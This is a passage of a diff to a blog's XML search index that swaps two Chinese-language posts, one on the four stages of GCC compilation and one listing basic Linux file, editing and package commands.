href="#移动、重命名-文件-文件夹" class="headerlink" title="移动、重命名 文件/文件夹"></a>移动、重命名 文件/文件夹</h2><blockquote><p><code>mv &lt;源文件/源文件夹 路径&gt; &lt;移动后的 文件/文件夹 路径&gt;</code><br><code>mv &lt;源文件名&gt; &lt;修改后的文件名&gt;</code></p></blockquote><hr><h2 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h2><blockquote><p>1.<code>--purge</code> 是可选项，这个属性是将软件及其配置文件一并删除<br><code>sudo apt-get --purge remove &lt;包名&gt;</code><br>2.如果不需要删除配置文件，则不加 <code>--purge</code> 选项<br><code>sudo apt-get remove &lt;包名&gt;</code></p></blockquote><hr><h2 id="删除文件-文件夹"><a href="#删除文件-文件夹" class="headerlink" title="删除文件/文件夹"></a>删除文件/文件夹</h2><blockquote><p><code>rm -d &lt;目录名&gt;</code>（删除一个空目录）<br><code>rm -r &lt;目录名&gt;</code>（删除一个非空目录）<br><code>rm 文件名</code>（删除文件）</p></blockquote><hr><h2 id="安装-deb-文件包"><a href="#安装-deb-文件包" class="headerlink" title="安装 .deb 文件包"></a>安装 .deb 文件包</h2><blockquote><p><code>sudo dpkg -i &lt;.deb 文件名&gt;</code></p></blockquote>]]></content>
+        <content type="html"><![CDATA[<h2 id="GCC-编译主要包括四个阶段"><a href="#GCC-编译主要包括四个阶段" class="headerlink" title="GCC 编译主要包括四个阶段"></a>GCC 编译主要包括四个阶段</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul><li>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名<ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</li><li>GCC 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，GCC 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</li><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd &lt;文件名.o&gt; -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>GCC 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</li><li>链接操作由链接器（ld.so）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul>]]></content>
       
       
       <categories>
@@ -1462,11 +1462,11 @@
     
     
     <entry>
-      <title>GCC编译过程</title>
-      <link href="/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
-      <url>/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
+      <title>Linux下的操作命令</title>
+      <link href="/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
+      <url>/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
       
-        <content type="html"><![CDATA[<h2 id="GCC-编译主要包括四个阶段"><a href="#GCC-编译主要包括四个阶段" class="headerlink" title="GCC 编译主要包括四个阶段"></a>GCC 编译主要包括四个阶段</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul><li>主要是处理源代码中以 <code>&quot;#&quot;</code> 开头的预处理指令，比如 <code>#include</code>、<code>#define</code> 等，将其置换后直接插入程序文本中，得到另一个 C 程序，通常以 <code>.i</code> 作为扩展名<ol><li>递归处理 <code>#include</code> 预处理指令，将对应文件的内容复制到该指令的位置</li><li>删除所有的 <code>#define</code> 指令，并在其被引用的位置递归地展开所有的宏</li><li>处理所有的条件预处理指令，如：<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code> 等</li><li>删除所有的注释</li><li>添加行号和文件名标识</li></ol></li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><ul><li>将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码，通常以 <code>.s</code> 作为扩展名</li><li>GCC 默认使用 <code>AT&amp;T</code> 格式的汇编语言，添加编译选项 <code>-masm = intel</code> 可以指定为 <code>intel</code> 格式</li><li>编译选项 <code>-fno-asynchronous-unwind-tables</code> 用于生成没有 cfi 宏的汇编指令，提高可读性</li><li>若 <code>printf()</code> 只有单一参数，GCC 的优化策略会将其替换成 <code>puts()</code> 以提高性能</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>汇编器根据汇编指令与机器指令对照表进行翻译，通常以 <code>.o</code> 作为扩展名</li><li>此时的 <code>.o</code> 文件是一个可重定位文件，可以使用 <code>objdump -sd &lt;文件名.o&gt; -M intel</code> 查看其内容</li><li>由于此时还未进行链接，文件符号中的虚拟地址无法确定</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul><li>GCC 默认为动态链接（添加编译选项 <code>- static</code> 可指定使用静态编译）</li><li>将目标文件及其依赖库进行链接，生成可执行文件。包括：地址和空间分配、符号绑定、重定位等</li><li>链接操作由链接器（ld.so）完成，然后就会得到一个可执行文件，其包含了大量的库文件</li><li>链接完成后，上一步无法确定的虚拟地址就被修正为实际的符号地址，可以被加载到内存中正常执行</li></ul>]]></content>
+        <content type="html"><![CDATA[<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><blockquote><p>一个点（<code>./</code>），代表本级目录<br>两个点（<code>../</code>），代表上级目录</p></blockquote><hr><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><blockquote><p><code>cat &lt;文件名&gt;</code></p></blockquote><hr><h2 id="转到盘符-目录"><a href="#转到盘符-目录" class="headerlink" title="转到盘符/目录"></a>转到盘符/目录</h2><blockquote><p><code>cd E:</code><br><code>cd &lt;路径名&gt;</code></p></blockquote><hr><h2 id="显示目录中的文件"><a href="#显示目录中的文件" class="headerlink" title="显示目录中的文件"></a>显示目录中的文件</h2><blockquote><p><code>ls &lt;目录名&gt;</code>（仅显示可见文件）<br><code>ls -a</code>（显示所有文件，包括隐藏文件）<br><code>ll</code>（显示详细信息）</p></blockquote><hr><h2 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h2><blockquote><p><code>mv &lt;文件名1&gt; &lt;文件名2&gt;</code></p><p>1.文件被命名为 <code>.</code> 开头时，如 <code>.flag</code>，则 <code>flag</code> 为隐藏文件，<code>ls</code> 无法查看，需用 <code>ls -a</code> 才可以看到<br>2.将隐藏文件重命名去掉开头的 <code>.</code> 时，文件恢复可见</p></blockquote><hr><h2 id="编辑文档"><a href="#编辑文档" class="headerlink" title="编辑文档"></a>编辑文档</h2><blockquote><p><code>vim &lt;文件名&gt;</code><br><code>i</code>（进入编辑模式）<br><code>esc</code>（退出编辑模式）<br><code>:q</code>（退出，但不保存）<br><code>:wq</code>（保存并退出）<br><code>esc</code> <code>u</code>（撤销之前的操作）</p></blockquote><hr><h2 id="给文件增加可执行权限"><a href="#给文件增加可执行权限" class="headerlink" title="给文件增加可执行权限"></a>给文件增加可执行权限</h2><blockquote><p><code>chmod a+x &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-elf-可执行文件"><a href="#运行-elf-可执行文件" class="headerlink" title="运行 elf 可执行文件"></a>运行 elf 可执行文件</h2><blockquote><p><code>./ &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-python-程序"><a href="#运行-python-程序" class="headerlink" title="运行 python 程序"></a>运行 python 程序</h2><blockquote><p><code>python3 &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-C-代码"><a href="#运行-C-代码" class="headerlink" title="运行 C 代码"></a>运行 C 代码</h2><blockquote><p><code>gcc &lt;.c文件名&gt; -o &lt;编译生成的文件名&gt;</code><br><code>./&lt;编译生成的文件名&gt;</code></p></blockquote><hr><h2 id="复制-文件-文件夹"><a href="#复制-文件-文件夹" class="headerlink" title="复制 文件/文件夹"></a>复制 文件/文件夹</h2><blockquote><p><code>cp &lt;源文件/源文件夹 路径&gt; &lt;复制到 文件/文件夹&gt;</code></p></blockquote><hr><h2 id="移动、重命名-文件-文件夹"><a href="#移动、重命名-文件-文件夹" class="headerlink" title="移动、重命名 文件/文件夹"></a>移动、重命名 文件/文件夹</h2><blockquote><p><code>mv &lt;源文件/源文件夹 路径&gt; &lt;移动后的 文件/文件夹 路径&gt;</code><br><code>mv &lt;源文件名&gt; &lt;修改后的文件名&gt;</code></p></blockquote><hr><h2 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h2><blockquote><p>1.<code>--purge</code> 是可选项，这个属性是将软件及其配置文件一并删除<br><code>sudo apt-get --purge remove &lt;包名&gt;</code><br>2.如果不需要删除配置文件，则不加 <code>--purge</code> 选项<br><code>sudo apt-get remove &lt;包名&gt;</code></p></blockquote><hr><h2 id="删除文件-文件夹"><a href="#删除文件-文件夹" class="headerlink" title="删除文件/文件夹"></a>删除文件/文件夹</h2><blockquote><p><code>rm -d &lt;目录名&gt;</code>（删除一个空目录）<br><code>rm -r &lt;目录名&gt;</code>（删除一个非空目录）<br><code>rm 文件名</code>（删除文件）</p></blockquote><hr><h2 id="安装-deb-文件包"><a href="#安装-deb-文件包" class="headerlink" title="安装 .deb 文件包"></a>安装 .deb 文件包</h2><blockquote><p><code>sudo dpkg -i &lt;.deb 文件名&gt;</code></p></blockquote>]]></content>
       
       
       <categories>
